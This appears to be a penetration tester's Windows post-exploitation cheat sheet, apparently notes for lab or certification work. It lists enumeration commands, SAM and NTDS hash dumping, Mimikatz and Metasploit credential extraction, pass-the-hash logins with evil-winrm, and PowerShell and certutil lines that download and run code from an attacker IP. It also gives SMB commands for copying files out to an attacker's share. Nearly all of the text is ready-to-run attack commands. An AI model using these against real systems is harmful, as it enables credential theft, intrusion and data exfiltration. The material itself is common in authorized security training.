### Enumeration
```
systeminfo
wmic service get name,displayname,pathname,startmode    # list all the running services
wmic service get name,displayname,pathname,startmode |findstr /i "auto" |findstr /i /v "c:\windows"
netstat -ano    # find out what ports are open
net users
net user /domain [username]   # check domain group of the user
icacls "C:\Puppet"    # check path permission
whoami /priv    # Look for SeImpersonatePrivilege > Juicy Potato
```

### SAM (Security Account Manager)
A file that store Windows user credential. It can only be accessed when the Windows OS is not booted up. (Eg. from another OS) <br />
Passwords are LM & NTLM hashed <br />
```
Default file location: 
C:\Windows\System32\config\SAM
C:\Windows\System32\config\SYSTEM

Dumping hashes:
samdump2 SYSTEM SAM
pwdump.py SYSTEM SAM    # For Windows 10

Format of Hashes:
[USERNAME]:[RID]:[LMHash]:[NTLMHash]:::   # RID = Relative Identifier
```

Ref: https://techgenix.com/how-cracked-windows-password-part2/

### Active Directory & LDAP
Enum
```
nmap -n -sV --script "ldap* and not brute" [IP_ADDR]
ldapsearch -H ldap://[IP_ADDR] -x -b "dc=[DC],dc=[DC]"
ldapsearch -H ldap://[IP_ADDR] -x -b '' -s base
windapsearch.py -d [DOMAIN] --dc-ip [IP_ADDR] -U    # -U to enumerate all AD users; -G for AD group enumerate

Database of AD stored on C:\Windows\NTNDS\ntds.dit of DC
```
Ref: https://book.hacktricks.xyz/pentesting/pentesting-ldap

### PowerShell
```
C:\Users\[username]\AppData\Roaming\Microsoft\Windows\Powershell\PSReadline\ConsoleHost_history.txt   # check powershell history
IEX ( IWR http://[IP_ADDR]/[PATH] -UseBasicParsing)   # equil linux wget http://[IP_ADDR]/[PATH] to upload file to the server
iwr http://[IP_ADDR]/[PATH] -OutFile [FILE]
IEX(New-Object Net.Webclient).downloadString('http://[IP_ADDR]/[PATH]')
Get-ADDomain | select DNSRoot,NetBIOSName,DomainSID   # retrieve SID
nltest /domain_trusts   # show inbound/outbound trust
Get-ADUser -Filter * | select SamAccountName    # list users(name ending with $ indicate trust keys being stored)
Get-ADObject -LDAPFilter "objectClass=User" -Properties SamAccountName | select SamAccountName    # to retrieve user and computer accounts(ending with $)

```

### Metasploit
```
getsystem
load kiwi   # mimikatz
lsa_dump_sam
```

### iCACLS.exe
```
Change file and folder permission 
icacls [FILE] /grant [USERNAME]:F   # :F for full access
```
Ref: https://ss64.com/nt/icacls.html

### RPC
```
rpcdump.py [USERNAME]@[IP_ADDR]
rpcclient -U '' [IP_ADDR]
  > enumdomusers    # to get list of users after signin
```

### Evil-WinRM
```
evil-winrm -i [IP_ADDR] -u [USERNAME] -H [HASH]   # hash retrievable from secretsdump.py machines/smb
evil-winrm -i [IP_ADDR] -u [USERNAME] -p [PASSWORD]
```

### Tcpdump
```
tcpdump -i tun0 icmp -v   # listen for icmp ping to tun0 interface
```

### Mimikatz
```
privilege::debug
token::elevate
lsadump::sam
```

### wget equivalant / file transfer
```
certutil.exe -f -urlcache -split http://192.168.49.157/winPEASany.exe

SMB method: 
On kali:
impacket-smbserver [SHARE NAME] $(pwd) -smb2support -user [USER ON KALI] -password [PASSWORD ON KALI]
On windows:
$pass = convertto-securestring '[PASSWORD ON KALI]' -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential('[USER ON KALI]', $pass)
New-PSDrive -NAME [USER] -PSProvider FileSystem -Credential $cred -Root \\[KALI IP]\[SHARE NAME]

--------Windows to Linux----------
Via SMB:
on Linux : smbserver.py test ./share
smbserver.py [share_name] [folder_path]
on Windows: copy proof.txt \\192.168.119.160\test\proof.txt
copy [file to transfer] \\[linux ip]\[share_name]\[output file name]
```
